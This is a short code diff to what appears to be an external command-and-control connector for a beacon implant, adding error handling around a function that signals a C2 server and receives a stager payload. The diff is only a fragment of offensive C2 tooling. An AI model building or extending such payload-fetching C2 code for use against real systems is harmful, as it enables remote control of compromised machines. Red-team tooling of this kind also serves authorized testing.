@@ -26,10 +26,12 @@ def configureOptions(sock, arch, pipename, block):
 
 
 def requestStager(sock):
-    commonUtils.sendFrameToC2(sock, "go")
-    stager_payload = commonUtils.recvFrameFromC2(sock)
-    return stager_payload
-
+    try:
+        commonUtils.sendFrameToC2(sock, "go")
+        stager_payload = commonUtils.recvFrameFromC2(sock)
+        return stager_payload
+    except Exception as e:
+        print(f'Error: {e}')
 
 async def loadStager(sock, beaconId):
     # Send options to the external C2 server
